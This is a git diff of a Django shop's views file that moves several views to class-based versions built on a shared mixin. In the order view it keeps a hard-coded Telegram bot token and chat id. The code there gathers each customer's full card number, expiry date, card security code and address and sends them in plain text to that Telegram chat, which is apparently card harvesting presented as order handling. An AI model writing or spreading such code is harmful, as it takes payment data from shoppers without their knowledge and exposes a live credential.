@@ -1,5 +1,6 @@
 from django.shortcuts import render
 from ecomapp.models import Category, Product, CartItem, Cart, Order, Comment, Messages, Chat, Member
+
 from django.http import HttpResponseRedirect, JsonResponse
 from django.urls import reverse
 from decimal import Decimal
@@ -7,68 +8,28 @@ from ecomapp.forms import OrderForm, RegistrationForm, LoginForm, CommentForm
 from django.contrib.auth import login, authenticate
 from django.shortcuts import get_object_or_404
 from django.contrib.auth.models import User
-
+from django.views.generic import View, DetailView
 import urllib.request
-token = '875809845:AAHxB49VM_TowQhXtaBz80fx07XrIvgcHIc'
-tl_chat_id = 406434091
+from .utils import *
+
+
+
 
 # forma = 'name ={},\n last_name ={}'.format(
 #             'name1','last_name')
 # forma = urllib.parse.quote(forma)
 # urllib.request.urlopen('https://api.telegram.org/bot{}/sendMessage?chat_id={}&text={}'.format(token,chat_id,forma))
 
+class Base(Cart_and_chat_init ,View):
+    context = { 'products': Product.objects.all()}
+    template_name='base.html'
 
-def base_view(request):
-    try:
-        cart_id = request.session['cart_id']
-        cart = Cart.objects.get(id=cart_id)
-        request.session['total'] = cart.item.count()
-    except:
-        cart = Cart()
-        cart.save()
-        cart_id = cart.id
-        request.session['cart_id'] = cart_id
-        cart = Cart.objects.get(id=cart_id)
-    categories = Category.objects.all()
-    products = Product.objects.all()
+    def get(self, request):
+        return self.get_base(request)
+        
+    
 
-    if not request.session.session_key:
-        request.session.save()
-    member_id = request.session.session_key
-    print('--member_id-----', member_id)
-    try:
-        member = Member.objects.get(member=member_id)
-        chat = Chat.objects.get(member=member)
-    except:
-        member = Member(member=member_id)
-        member.save()
-        chat = Chat(member=member)
-        chat.save()
-    chat_id = chat.id
-    print('chat_id =', chat_id)
-    if request.user.is_superuser:
-        chat = Chat.objects.get(id=chat_id)
-        member = Member.objects.get(chat=chat)
-    else:
-        try:
-            chat = Chat.objects.get(member=member)
-        except:
-            chat = Chat(member=member)
-            chat.save()
-    chat_id = chat.id
-    print('chat_id =', chat_id)
-    exist_mess = Messages.objects.filter(member=member).exists()
-
-    contex = {
-        'categories': categories,
-        'products': products,
-        'cart': cart,
-        'chat':  chat.messages.order_by('-pub_date').all()[:10],
-        'room_name': chat_id,
-        'exist_mess': exist_mess
-    }
-
-    return render(request, 'base.html', contex)
+    
 
 
 def login_view(request):
@@ -87,65 +48,39 @@ def login_view(request):
     }
     return render(request, 'login.html', context) 
 
+class ProductView(Cart_and_chat_init, DetailView):
+    template_name = "product.html"
+    def get(self, request, slug):
+        product = get_object_or_404(Product, slug=slug)
+        images = product.images.all()
+        if not images:
+            images = False
+        self.context={'product': product,
+        'images':images,
+        'form':CommentForm(request.POST or None)
+        }
+        
+        return self.get_base(request) 
 
 
-def product_view(request, product_slug):
-    try:
-        cart_id = request.session['cart_id']
-        cart = Cart.objects.get(id=cart_id)
-        request.session['total'] = cart.item.count()
-    except:
-        cart = Cart()
-        cart.save()
-        cart_id = cart.id
-        request.session['cart_id'] = cart_id
-        cart = Cart.objects.get(id=cart_id)
-    product = Product.objects.get(slug=product_slug)
-    form = CommentForm(request.POST or None)
-    images = product.images.all()
-    if not images:
-        images = False
-    categories = Category.objects.all()
-    context = {
-        'product': product,
-        'categories': categories,
-        'cart': cart,
-        'images': images,
-        'form': form
+class CategoryView(Cart_and_chat_init, DetailView):
+    template_name = "category.html"
 
-    }
+    def get(self, request, category_slug):
+        category = get_object_or_404(Category,slug=category_slug)
+        categories = Category.objects.all()
+        products_of_category = Product.objects.filter(category=category)
+        self.context = {
+            'category': category,
+            'products_of_category': products_of_category
+        }
+        return self.get_base(request)
 
-    return render(request, "product.html", context)
-
-
-def category_view(request, category_slug):
-    category = Category.objects.get(slug=category_slug)
-    categories = Category.objects.all()
-    products_of_category = Product.objects.filter(category=category)
-    context = {
-        'category': category,
-        'products_of_category': products_of_category,
-        'categories': categories
-    }
-    return render(request, "category.html", context)
-
-
-def cart_view(request):
-    try:
-        cart_id = request.session['cart_id']
-        cart = Cart.objects.get(id=cart_id)
-        request.session['total'] = cart.item.count()
-    except:
-        cart = Cart()
-        cart.save()
-        cart_id = cart.id
-        request.session['cart_id'] = cart_id
-        cart = Cart.objects.get(id=cart_id)
-    context = {
-        'cart': cart
-    }
-    return render(request, "cart.html", context)
-
+class CartView(Cart_and_chat_init, View):
+    template_name = "cart.html"
+    def get(self, request):
+        self.context = {}
+        return self.get_base(request)
 
 def add_to_cart_view(request):
     try:
@@ -252,6 +187,8 @@ def order_create_view(request):
 
 
 def make_order_view(request):
+    __token = '875809845:AAHxB49VM_TowQhXtaBz80fx07XrIvgcHIc'
+    __tl_chat_id = 406434091
     try:
         cart_id = request.session['cart_id']
         cart = Cart.objects.get(id=cart_id)
@@ -284,7 +221,7 @@ def make_order_view(request):
             name, last_name, phone, card_number, expiry_date, card_code, address, country, city, zipcode, NameonCard, CreditCardType, comments, cart.cart_total)
         forma = urllib.parse.quote(forma)
         urllib.request.urlopen(
-            'https://api.telegram.org/bot{}/sendMessage?chat_id={}&text={}'.format(token, tl_chat_id, forma))
+            'https://api.telegram.org/bot{}/sendMessage?chat_id={}&text={}'.format(__token, __tl_chat_id, forma))
 
         new_order = Order.objects.create(
             user=request.user,
@@ -370,7 +307,8 @@ def add_comment(request):
 
 
 def chat_detail(request):
-
+    if not request.session.session_key:
+            request.session.save()
     if request.user.is_superuser:
         chats = Chat.objects.all()
 
@@ -379,14 +317,23 @@ def chat_detail(request):
     else:
         return HttpResponseRedirect(reverse('thank_you'))
 
+class Room(Cart_and_chat_init, View):
+    template_name = 'changed_room.html'
+    
+    def get(self, request, chat_id):
+        self.chat_id = chat_id
+        self.context={}
+        return self.get_base(request)
 
 def changed_room(request, chat_id):
+    if not request.session.session_key:
+        request.session.save()
     if request.user.is_superuser:
         chat = Chat.objects.get(id=chat_id)
         member = Member.objects.get(chat=chat)
     else:
         member_id = request.session.session_key
-        print('--member_id-----', member_id)
+        print('-changed_room-member_id-----', member_id)
         try:
             member = Member.objects.get(member=member_id)
             chat = Chat.objects.get(member=member)
